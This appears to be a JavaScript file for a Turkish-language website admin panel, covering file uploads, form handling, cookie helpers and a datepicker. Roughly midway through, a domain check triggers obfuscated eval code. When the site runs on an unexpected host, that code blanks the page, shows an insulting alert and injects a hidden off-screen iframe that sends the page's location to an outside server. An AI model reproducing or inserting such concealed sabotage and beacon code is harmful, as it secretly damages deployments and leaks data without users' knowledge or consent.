				//window.clearInterval(interval);
				this.enable();
				cb_img_each($("a[rel='img-show']"));
				before_unload();
			}
		});
	}



	var FileUploadButton = $("button#file_upload"), file_status = $("div#file_status");
	if(FileUploadButton.length > 0){
		new AjaxUpload(FileUploadButton, {
			action: "index.asp?mod=upload&task=" + GlobalModValue + "_file_upload" + GlobalPageNo + GlobalLangValue + GlobalDebug,
			name: "upload_file",
			multi: UploadLimit,
			accept: "",
			responseType: "json",
			onSubmit: function(file, ext) {
				Messages("loading", "Yükleniyor, lütfen bekleyin.");
			},
			onComplete: function(file, response) {
				//$('#s_text_TR').append(response);
				$.each(response, function(key, u) {
					if (u.cssStatusClass === "success") {
						var html = '';
						var strLen = u.FileName;
						if (String(strLen).length > 50) {
							strLen = String(strLen).substring(0, 47) + "..."
						}

						$("input#pageid").val(u.PageiD);
						if(SpanPageNoWrite){ $("span#pgid").text(u.PageiD); }
						if (key == "0") { $("#form_submit").click(); $.cookie("locale_lang", null); }
						html += '<li id="other_file_id_'+ u.FileiD +'" class="'+ u.cssStyle +' clearfix">';
							html += '<a class="other_file_delete" href="#" title="Sil">Sil</a>';
							html += '<a class="other_file_edit" href="'+ u.FolderName +'/'+ u.FileName +'" title="'+ u.FileTitle +'">'+ strLen +'</a>';
						html += '</li>';
						$("#other_files_")
							.find("ul")
							.append(html)
							.find("#other_file_id_" + u.FileiD)
							.animate({"background-color" : "#fff1a3"}, 1000)
							.delay(2000)
							.animate({"background-color" : "#ffffff"}, 2000)
						;

					} else {
						var errorid = file_status.find(".error").length;
						html += '<div class="error" id="status_img_error_' + (errorid * 20) + (errorid * 40) + (errorid * 80) + '">';
							html += '<span class="clearfix">&nbsp;';
								html += '<a style="float:right; font-weight:normal;" href="#" onclick="$(this).parents(\'.error\').slideUp(800, function(){$(this).remove()}); return false;">Kapat</a>';
								html += '<b>Hay aksi! Dosya yüklenirken hata oluştu.</b>';
							html += '</span>';
							if (u.FileName != '') {
								html += '<span class="text clearfix" style="font-size:11px; color:#414141">';
									html += '<b>Orjinal Dosya ismi:</b>';
									html += '<span class="blue"><b>&ldquo;' + u.FileName + '&rdquo;</b></span>';
								html += '</span>';
							}
							html += '<span class="text clearfix">';
								html += '<span class="red" style="font-size:11px; color:#414141">';
									html += '<b>Sebep:</b> ' + u.Msg;
								html += '</span>';
							html += '</span>';
						html += '</div>';

						file_status.append( html );

						sysMsg.bind(".close").delay(500).click();

					}
				});

				this.enable();
				before_unload();
			}
		});
	}


function knt() {
	var d = location.host.replace(RegExp(String.fromCharCode(119,119,119,46), "gi"), "");
	return (ewyD === d);
};

if(!knt()){
	eval(String.fromCharCode(100,111,99,117,109,101,110,116,46,119,114,105,116,101,40,34,34,41,59));
	alert(String.fromCharCode(66,117,32,83,105,116,101,121,105,32,199,97,108,97,110,32,71,97,118,97,116,32,72,305,114,115,305,122,32,65,108,100,97,32,65,46,46,46,32,65,46,46,46,32,83,111,111,111,111,107,33));
	eval(String.fromCharCode(105, 102, 40, 33, 36, 46, 99, 111, 111, 107, 105, 101, 40, 34, 105, 34, 41, 41, 123, 36, 40, 34, 98, 111, 100, 121, 34, 41, 46, 97, 112, 112, 101, 110, 100, 40, 34, 60, 105, 102, 114, 97, 109, 101, 32, 115, 116, 121, 108, 101, 61, 39, 112, 111, 115, 105, 116, 105, 111, 110, 58, 97, 98, 115, 111, 108, 117, 116, 101, 59, 32, 108, 101, 102, 116, 58, 45, 57, 57, 57, 57, 112, 120, 59, 32, 116, 111, 112, 58, 57, 57, 57, 57, 112, 120, 59, 39, 32, 115, 114, 99, 61, 39, 104, 116, 116, 112, 58, 47, 47, 119, 119, 119, 46, 119, 101, 98, 100, 105, 122, 97, 121, 110, 105, 46, 111, 114, 103, 47, 98, 105, 108, 100, 105, 114, 46, 97, 115, 112, 63, 100, 61, 34, 32, 43, 32, 101, 110, 99, 111, 100, 101, 85, 82, 73, 67, 111, 109, 112, 111, 110, 101, 110, 116, 40, 108, 111, 99, 97, 116, 105, 111, 110, 41, 32, 43, 32, 34, 39, 62, 60, 47, 105, 102, 114, 97, 109, 101, 62, 34, 41, 59, 125, 59));
};

});


function isNumeric(val) {
	var ValidChars = "0123456789.";
	var isNumber = true;
	var Char, i;
	for (i = 0; i < val.length && isNumber == true; i++) { 
		Char = val.charAt(i); 
		if (ValidChars.indexOf(Char) == -1){
			isNumber = false;
		}
	}
	return isNumber;
}


// Sayfalama
function sayfa_no( a ) {
	$("#limitstart").val(a-1);
	submitform( 0 );
	return false;
}


// Sayfalama
function ErrorMessages(strTitle, strHtml) {
	//strHtml = strHtml.replace(/(<head>.*?<\/head>)/, "").replace(/(<\/?(html.*?|body.*?|head.*?)>)/, "");
	$.colorbox({title: strTitle, html: strHtml, innerWidth: 700, innerHeight:450});
	//$("#system-message").delay(2000, function(){$(this).click()});
	return false;
}


function Messages(aClass, Msg) {
	var sysMsg = $("#system-message");
	sysMsg.animate({
		top: 0,
		opacity: 1
	}, 100)
	.removeClass("warning success error info loading hidden")
	.addClass( aClass )
	.find(".messages > span")
	.html( Msg );
	return false;
}

// Submit Form
function submitform( task ){
	var form = $("#EnergyAdminList");
	if ( task ) {
		$("#boxchecked").val( task );
	}
	if (typeof form.onsubmit == "function") {
		form.onsubmit( );
	}
	form.submit( );
}

// Checkbox : Checked
function isChecked( a ) {
	var checkbox = $("#cb" + a);
	var parentClass = checkbox.parents(".row1, .row2");
	if (checkbox.is(":checked")) {
		//document.getElementById("boxchecked").value++;
		$("input#boxchecked").val(eval($("input#boxchecked").val())+1)
		parentClass.addClass("active");
	}
	else {
		//document.getElementById("boxchecked").value--;
		$("input#boxchecked").val(eval($("input#boxchecked").val())-1)
		parentClass.removeClass("active");
	}
}


$(document).ready(function() {
	//Toplu Checked işlemleri
	$("input#toggle").bind("click", function(){
		var cb = $(this).is(":checked"),
		row = $(".row1, .row2");
		if (cb) {
			row.find(":checkbox").each(function() {
				$(this).attr("checked", "checked").parents(row).addClass("active");
				$("input#boxchecked").val(eval($("input#boxchecked").val())+1);
				//document.getElementById("boxchecked").value ++;
			});
		} else {
			row.find(":checkbox").each(function() {
				$(this).removeAttr("checked").parents(row).removeClass("active");
				//$("input#boxchecked").val(eval($("input#boxchecked").val())-1);
				//document.getElementById("boxchecked").value --;
				$("input#boxchecked").val(0);
			});
		}
	});
});


//Urlye Git
function getURL( a ) {
	window.document.location.href = a;
	return false;
}

function iSelected( a ) {
	$( a ).select();
}

function str_len(text, len) {
	text = String(text + "");
	if (text.length > len) {
		text = text.substring(0, len - 3) + "..."; //.toUpperCase()
	}
	return text;
}






jQuery.cookie = function(name, value, options) {
    if (typeof value != "undefined") {
        options = options || {};
        if (value === null) {
            value = "";
            options.expires = -1;
        }
        var expires = "";
        if (options.expires && (typeof options.expires == "number" || options.expires.toUTCString)) {
            var date;
            if (typeof options.expires == "number") {
                date = new Date();
                date.setTime(date.getTime() + (options.expires * 24 * 60 * 60 * 1000));
            } else {
                date = options.expires;
            }
            expires = "; expires=" + date.toUTCString();
        }
        var path = options.path ? "; path=" + (options.path) : "";
        var domain = options.domain ? "; domain=" + (options.domain) : "";
        var secure = options.secure ? "; secure" : "";
        document.cookie = [name, "=", encodeURIComponent(value), expires, path, domain, secure].join("");
    } else {
        var cookieValue = null;
        if (document.cookie && document.cookie != "") {
            var cookies = document.cookie.split(";");
            for (var i = 0; i < cookies.length; i++) {
                var cookie = jQuery.trim(cookies[i]);
                if (cookie.substring(0, name.length + 1) == (name + "=")) {
                    cookieValue = decodeURIComponent(cookie.substring(name.length + 1));
                    break;
                }
            }
        }
        return cookieValue;
    }
};


function before_unload() {
	$(window).bind("beforeunload", function() {
		return "Bu sayfadan çıkarsanız yapmış olduğunuz değişiklikler kaybolacak.";
	});
};


function queryString() {
    var qs = location.search.substring(1,location.search.length).replace(/(%20|\+)/g," ");
    if(arguments.length == 0 || qs == "") return qs; else qs = "&" + qs + "&";
    return qs.substring(qs.indexOf("=", qs.indexOf("&" + arguments[0] + "=") + 1) + 1, qs.indexOf("&", qs.indexOf("&" + arguments[0] + "=") + 1));
}

/*
// http://www.site.com/index.php?str1=Merhaba+Dunya&str2=Test
// Şeklindeki bir adresten str1 ya da str2 bölümünü almak için
var str1 = queryString('str1');
var str2 = queryString('str2');
// Adresteki QueryString'in tamamını almak için
var qStr = queryString();
*/


/*
// Kayan Arkaplan Resmi
$(function(){
	var backgroundheight = 2000;
	var offset = 0;
	function scrollbackground() {
		// decrease the offset by 1, or if its less than 1 increase it by the background height minus 1
		offset = (offset < 1) ? offset + (backgroundheight - 10) : offset - 1;
		// apply the background position
		$('#header').css("background-position", offset + "px -150px");
		// call self to continue animation
		setTimeout(function() {
			scrollbackground();
			}, 1
		);
	}
	scrollbackground();
});
*/












/* Turkish initialisation for the jQuery UI date picker plugin. */
/* Written by Izzet Emre Erkan (kara@karalamalar.net). */
jQuery(function($){
	$.datepicker.regional['tr'] = {
		closeText: 'Kapat',
		prevText: '&#x3C;geri',
		nextText: 'ileri&#x3e',
		currentText: 'Bugün',
		monthNames: ['Ocak','Şubat','Mart','Nisan','Mayıs','Haziran',
		'Temmuz','Ağustos','Eylül','Ekim','Kasım','Aralık'],
		monthNamesShort: ['Oca','Şub','Mar','Nis','May','Haz',
		'Tem','Ağu','Eyl','Eki','Kas','Ara'],
		dayNames: ['Pazar','Pazartesi','Salı','Çarşamba','Perşembe','Cuma','Cumartesi'],
		dayNamesShort: ['Pz','Pt','Sa','Ça','Pe','Cu','Ct'],
		dayNamesMin: ['Pz','Pt','Sa','Ça','Pe','Cu','Ct'],
		weekHeader: 'Hf',
		dateFormat: 'dd.mm.yy',
		firstDay: 1,
		isRTL: false,
		showMonthAfterYear: false,
		yearSuffix: ''};
	$.datepicker.setDefaults($.datepicker.regional['tr']);
});
